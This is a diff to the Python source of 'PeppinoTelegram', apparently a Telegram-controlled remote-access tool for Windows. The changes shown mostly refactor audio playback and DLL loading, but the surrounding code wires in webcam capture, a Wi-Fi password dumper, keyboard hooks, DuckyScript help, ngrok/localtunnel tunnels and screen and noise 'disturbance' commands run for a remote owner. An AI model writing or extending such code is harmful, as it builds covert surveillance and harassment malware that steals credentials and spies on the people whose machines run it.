@@ -43,6 +43,7 @@ import sys
 import json
 import ctypes
 import psutil
+import pyngrok
 import inspect
 import functools
 import traceback
@@ -61,7 +62,7 @@ from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN, KEY_UP
-from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
+from os.path import join, abspath, isdir, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
 
 def resource_path(relative_path: str) -> str:
@@ -71,18 +72,13 @@ def resource_path(relative_path: str) -> str:
         base_path = dirname(__file__)
     return join(base_path, relative_path)
 
-def load_dll(name: str) -> None:
-    print(f"Loading DLL:", name)
-    if getattr(sys, "frozen", False):
-        base = sys._MEIPASS
-    else:
-        base = os.path.dirname(__file__)
-
-    path = os.path.join(base, name)
+def load_dll(path: str) -> None:
+    print(f"Loading DLL:", path)
+    path = resource_path(path)
     try:
         ctypes.WinDLL(path)
     except Exception as e:
-        print(f"Error while loading the dll: {name}\n{e}")
+        print(f"Error while loading the dll: {path}\n{e}")
 
 # CONSTANTS
 logging = True
@@ -108,12 +104,14 @@ try:
 except Exception as e:
     print(e)
     exit()
-
-for file in listdir(DLLS_DIR):
-    if file.endswith(".dll"):
-        load_dll(join(DLLS_DIR, file))
+if isdir(DLLS_DIR):
+    print(f"DLLS Directory exists: {DLLS_DIR}")
+    for file in listdir(DLLS_DIR):
+        if isfile(file) and file.endswith(".dll"):
+            load_dll(join(DLLS_DIR, file))
+else:
+    print(f"Error: DLLS directory not does not exist or it was empty: {DLLS_DIR}")
 #UTILS
-import pyngrok
 from utils import *
 try:
     from plugins import *
@@ -333,7 +331,7 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, logger: DebugLogger,  loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
+    def __init__(self, token: str, owner_id: int, ngrok_token: str, capture: VideoCapture, logger: DebugLogger,  loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
         self.token = token
         self.owner_id = owner_id
         self.ngrok_token = ngrok_token
@@ -376,7 +374,6 @@ class PeppinoTelegram:
         self.processmonitorlist = {} 
         self.duckyhelp = DUCKYHELP
         self.explorer_path = getcwd() # For now I'm not looing forward to make a file explorer
-        self.audio_mixer = mixer
         self.running = True
         self.message_timeout = 5
         self.has_admin = is_admin()
@@ -391,6 +388,8 @@ class PeppinoTelegram:
 
         self.overlay_tk = OverlayManager(self, BURN_DIRECTORY)
         self.overlay_opencv = OpenCVOverlayPlayer()
+        self.audio_mixer = CustomMixer()
+        self.audio_player = AudioPlayer()
 
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
@@ -466,7 +465,7 @@ class PeppinoTelegram:
             Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "audio", "🎚️ Set Volume"),
             Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "audio", "📊 Get Volume"),
             Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "audio", "🎛️ Mixer Menu"),
-            Command("playfromurl", play_from_url, "Play audio from URL.", "audio", "🔗 Play from URL"),
+            Command("playfromurl", self.audio_player.play_from_url, "Play audio from URL.", "audio", "🔗 Play from URL"),
             Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "audio", "📡 Play Noise"),
             Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay with audio.", "audio", "🌀📻 Video&Sound Disturbance"),
 
@@ -586,8 +585,7 @@ class PeppinoTelegram:
         old = self.audio_mixer.getVolumePercentage()
         if volume:
             self.set_volume(volume)
-        play_wav(self.audios[audio])
-        sleep(5)
+        self.audio_player.play_wav(self.audios[audio])
         if volume:
             self.set_volume(old)
 
@@ -1101,7 +1099,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if showimage:
             imageThread.start()
         if playaudio:
-            play_wav(audio)
+            self.audio_player.play_wav(audio)
         if showimage:
             imageThread.join()
         self.audio_mixer.setVolumePercentage(old_volume)
@@ -1574,7 +1572,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         with open(filepath, "wb") as f:
             f.write(response.content) 
         new_filepath = ogg_to_wav(filepath, rmold=True)
-        play_wav(new_filepath, False)
+        self.audio_player.play_wav(new_filepath, False)
         remove(new_filepath)
 
     def parse_command(self, text: str) -> None:
@@ -1931,7 +1929,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Playing random noise for {duration} seconds")
         start = monotonic()
         loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
-        thread = Thread(target=play_random_noise, args=(duration,))
+        thread = Thread(target=self.audio_player.play_random_noise, args=(duration,))
         thread.start()
         while (monotonic()-start) < duration:
             elapsed = int(monotonic()-start)
@@ -2692,11 +2690,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def disturbed_overlay_and_random_noise(self, duration: int) -> None:
         print(f"Starting disturbed overlay and noise for {duration} seconds")
-        t2 = Thread(target=play_random_noise, args=(duration,))
+        t2 = Thread(target=self.audio_player.play_random_noise, args=(duration,))
         t2.start()
         self.wrapper_for_disturbed_overlay(duration,
                                       custom_label="Disturbance Overlay and noise",
-                                      custom_oncancel=lambda: (stopallsounds(), self.overlay_opencv.setstop()))
+                                      custom_oncancel=self.audio_player.stopallsounds)#, self.overlay_opencv.setstop()))
                                       #TODO Noise still does not stop
         t2.join()
 
@@ -2721,7 +2719,6 @@ if __name__ == "__main__":
             fo.write(traceback.format_exc())
             fo.write(str(e))
         """
-    mixer = CustomMixer()
     capture = VideoCapture(0)
     if logging:
         logger = DebugLogger()
@@ -2745,7 +2742,7 @@ if __name__ == "__main__":
         except Exception as e:
             signal_error += f"Unhandled exception: {e}\n"
 
-    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)
+    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)
 
     # Use only if developer
     if GENERATE_COMMANDS_MD:
